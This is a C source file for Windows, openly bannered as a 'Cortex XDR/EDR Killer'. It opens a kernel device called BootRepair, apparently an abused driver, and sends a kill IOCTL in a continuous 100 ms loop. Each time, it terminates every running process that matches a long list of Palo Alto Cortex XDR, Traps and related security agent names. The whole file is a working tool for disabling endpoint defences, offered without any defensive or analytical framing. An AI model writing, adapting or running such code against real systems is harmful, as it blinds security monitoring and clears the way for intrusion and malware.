#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_KILL 0x222014
#define DEVICE_PATH L"\\\\.\\BootRepair"

// Process list: Palo Alto Networks Cortex XDR / Cortex EDR only
static const wchar_t *targets[] = {
    // Core Cortex XDR Processes
    L"CortexXDR.exe",              // Main Cortex XDR executable
    L"CortexXDRService.exe",       // Cortex XDR Service
    L"CortexXDRAgent.exe",         // Cortex XDR Agent
    L"CortexXDRMonitor.exe",       // Cortex XDR Monitor
    L"CortexXDRUpdater.exe",       // Cortex XDR Updater
    L"CortexXDRScanner.exe",       // Cortex XDR Scanner
    L"CortexXDRProtection.exe",    // Cortex XDR Protection Module
    L"CortexXDRDetection.exe",     // Cortex XDR Detection Engine
    L"CortexXDRResponse.exe",      // Cortex XDR Response Module
    L"CortexXDRInvestigation.exe", // Cortex XDR Investigation Tool

    // Cortex EDR / Traps Processes
    L"CyveraService.exe", // Cortex EDR Service (formerly Traps)
    L"CyveraAgent.exe",   // Cortex EDR Agent
    L"CyveraConsole.exe", // Cortex EDR Console
    L"CyveraUpdater.exe", // Cortex EDR Updater
    L"CyveraMonitor.exe", // Cortex EDR Monitor
    L"TrapsService.exe",  // Traps Service (legacy)
    L"TrapsAgent.exe",    // Traps Agent (legacy)
    L"TrapsMonitor.exe",  // Traps Monitor (legacy)
    L"TrapsUpdater.exe",  // Traps Updater (legacy)

    // Cortex XDR Components
    L"xdrservice.exe",     // XDR Service
    L"xdragent.exe",       // XDR Agent
    L"xdrmonitor.exe",     // XDR Monitor
    L"xdrscanner.exe",     // XDR Scanner
    L"xdrprotection.exe",  // XDR Protection
    L"xdrhandler.exe",     // XDR Handler
    L"xdrprocessor.exe",   // XDR Processor
    L"xdranalyzer.exe",    // XDR Analyzer
    L"xdrcollector.exe",   // XDR Collector
    L"xdruploader.exe",    // XDR Uploader
    L"xdrtelemetry.exe",   // XDR Telemetry
    L"xdrhealth.exe",      // XDR Health Monitor
    L"xdrwatchdog.exe",    // XDR Watchdog
    L"xdrhelper.exe",      // XDR Helper Service
    L"xdrnetmon.exe",      // XDR Network Monitor
    L"xdrprocessmon.exe",  // XDR Process Monitor
    L"xdrfilemon.exe",     // XDR File Monitor
    L"xdrregistrymon.exe", // XDR Registry Monitor
    L"xdrmemorymon.exe",   // XDR Memory Monitor
    L"xdrbehavioral.exe",  // XDR Behavioral Analysis

    // Palo Alto Networks Common Components
    L"PaloAltoService.exe",  // Palo Alto Service
    L"PaloAltoAgent.exe",    // Palo Alto Agent
    L"PaloAltoMonitor.exe",  // Palo Alto Monitor
    L"PaloAltoUpdater.exe",  // Palo Alto Updater
    L"PaloAltoNetworks.exe", // Palo Alto Networks Main
    L"PANService.exe",       // PAN Service
    L"PANSvc.exe",           // PAN Service

    // Cortex XDR Management Components
    L"CortexManagement.exe",   // Cortex Management Console
    L"CortexCLI.exe",          // Cortex Command Line Interface
    L"CortexGUI.exe",          // Cortex Graphical Interface
    L"CortexTray.exe",         // Cortex System Tray
    L"CortexNotification.exe", // Cortex Notifications
    L"CortexLogCollector.exe", // Cortex Log Collector
    L"CortexDiagnostics.exe",  // Cortex Diagnostics Tool
    L"CortexRestore.exe",      // Cortex Restore Utility
    L"CortexUninstall.exe",    // Cortex Uninstaller
    L"CortexInstaller.exe",    // Cortex Installer
    L"CortexConfig.exe",       // Cortex Configuration Tool
    L"CortexPolicy.exe",       // Cortex Policy Manager
    L"CortexQuarantine.exe",   // Cortex Quarantine Manager
    L"CortexRemediation.exe",  // Cortex Remediation Tool
    L"CortexForensics.exe",    // Cortex Forensics Collector

    // Cortex EDR Additional Components
    L"EDRService.exe",     // EDR Service
    L"EDRAgent.exe",       // EDR Agent
    L"EDRMonitor.exe",     // EDR Monitor
    L"EDRScanner.exe",     // EDR Scanner
    L"EDRHandler.exe",     // EDR Handler
    L"EDRProcessor.exe",   // EDR Processor
    L"EDRAnalyzer.exe",    // EDR Analyzer
    L"EDRCollector.exe",   // EDR Collector
    L"EDRUploader.exe",    // EDR Uploader
    L"EDRTelemetry.exe",   // EDR Telemetry
    L"EDRHealth.exe",      // EDR Health Monitor
    L"EDRWatchdog.exe",    // EDR Watchdog
    L"EDRHelper.exe",      // EDR Helper
    L"EDRNetMon.exe",      // EDR Network Monitor
    L"EDRProcessMon.exe",  // EDR Process Monitor
    L"EDRFileMon.exe",     // EDR File Monitor
    L"EDRRegistryMon.exe", // EDR Registry Monitor
    L"EDRMemoryMon.exe",   // EDR Memory Monitor
    L"EDRBehavioral.exe",  // EDR Behavioral Analysis

    // Cortex XDR Endpoint Security
    L"EndpointSecurity.exe",        // Endpoint Security Service
    L"EndpointSecurityAgent.exe",   // Endpoint Security Agent
    L"EndpointSecurityMonitor.exe", // Endpoint Security Monitor
    L"EndpointSecurityScanner.exe", // Endpoint Security Scanner
    L"EndpointProtection.exe",      // Endpoint Protection Module
    L"EndpointDetection.exe",       // Endpoint Detection Engine
    L"EndpointResponse.exe",        // Endpoint Response Module
    L"EndpointInvestigation.exe",   // Endpoint Investigation Tool

    // Cortex XDR Background Services
    L"PANDService.exe",   // PAN Background Service
    L"PANHelper.exe",     // PAN Helper Service
    L"CortexHelper.exe",  // Cortex Helper Service
    L"CortexService.exe", // Cortex Service
    L"CortexDaemon.exe",  // Cortex Daemon

    // Cortex XDR Security Components
    L"xdrsecurity.exe",           // XDR Security Module
    L"xdrfirewall.exe",           // XDR Firewall Module
    L"xdrwebprotection.exe",      // XDR Web Protection
    L"xdrnetworkprotection.exe",  // XDR Network Protection
    L"xdrendpointprotection.exe", // XDR Endpoint Protection
    L"xdrvulnerability.exe",      // XDR Vulnerability Scanner
    L"xdrpatch.exe",              // XDR Patch Management
    L"xdrexploit.exe",            // XDR Exploit Prevention
    L"xdrmalware.exe",            // XDR Malware Protection
    L"xdranomaly.exe",            // XDR Anomaly Detection

    L"cortex-xdr-payload.exe",
    L"cysandbox.exe",
    L"cyserver.exe",
    L"cyuserver.exe",
    L"cywscsvc.exe",
    L"tlaworker.exe",

    NULL};

// Helper to call the BootRepair IOCTL
static BOOL kill_process(HANDLE h, DWORD pid)
{
    DWORD ret;
    return DeviceIoControl(h, IOCTL_KILL, &pid, sizeof(pid), NULL, 0, &ret, NULL);
}

static void print_banner()
{
    printf("\n");
    printf("==========================================================\n");
    printf("        Palo Alto Networks Cortex XDR/EDR Killer\n");
    printf("        Using BootRepair Device Driver\n");
    printf("==========================================================\n\n");

    printf("[+] Target: Palo Alto Networks Cortex XDR / Cortex EDR\n");
    printf("[+] Components: Cortex XDR, Traps, Endpoint Security\n");
    printf("[+] Total processes tracked: %d\n", (sizeof(targets) / sizeof(targets[0])) - 1);
    printf("[+] Continuous kill mode (100ms loop)\n");
    printf("[+] Press Ctrl+C to stop\n\n");
}

int main()
{
    print_banner();

    HANDLE h = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open \\\\.\\BootRepair. Error: %d\n", GetLastError());
        printf("[-] Run as Administrator and ensure the driver is loaded.\n");
        return 1;
    }

    printf("[+] Device opened successfully\n\n");

    int total_killed = 0;
    DWORD last_pids[512] = {0}; // Cache to avoid repeated killing of same PID
    int cache_idx = 0;
    int loop_count = 0;

    while (1)
    {
        loop_count++;
        int killed_this_round = 0;

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE)
        {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);
            if (Process32FirstW(snap, &pe))
            {
                do
                {
                    for (int i = 0; targets[i] != NULL; i++)
                    {
                        if (_wcsicmp(pe.szExeFile, targets[i]) == 0)
                        {
                            // Avoid re-killing the same PID
                            BOOL already_killed = FALSE;
                            for (int j = 0; j < 512; j++)
                            {
                                if (last_pids[j] == pe.th32ProcessID)
                                {
                                    already_killed = TRUE;
                                    break;
                                }
                            }

                            if (!already_killed)
                            {
                                // Determine component type
                                const char *component = "Cortex";
                                if (wcsstr(pe.szExeFile, L"Traps"))
                                {
                                    component = "Traps";
                                }
                                else if (wcsstr(pe.szExeFile, L"EDR"))
                                {
                                    component = "EDR";
                                }
                                else if (wcsstr(pe.szExeFile, L"xdr"))
                                {
                                    component = "XDR";
                                }
                                else if (wcsstr(pe.szExeFile, L"Cyvera"))
                                {
                                    component = "Cyvera";
                                }

                                wprintf(L"[Loop %d] [%s] Killing %ls (PID: %lu)\n",
                                        loop_count, component, pe.szExeFile, pe.th32ProcessID);

                                if (kill_process(h, pe.th32ProcessID))
                                {
                                    printf("    [SUCCESS] Terminated\n");
                                    killed_this_round++;
                                    total_killed++;
                                    last_pids[cache_idx++ % 512] = pe.th32ProcessID;
                                }
                                else
                                {
                                    printf("    [FAILED] Error: %lu\n", GetLastError());
                                }
                            }
                            break;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }

        // Print status every 10 loops or when processes were killed
        if (killed_this_round > 0 || loop_count % 10 == 0)
        {
            printf("\n[STATUS] Loop %d - Killed this round: %d | Total Cortex processes killed: %d\n\n",
                   loop_count, killed_this_round, total_killed);
        }

        // 100ms delay - fast response without killing CPU
        Sleep(100);
    }

    CloseHandle(h);
    return 0;
}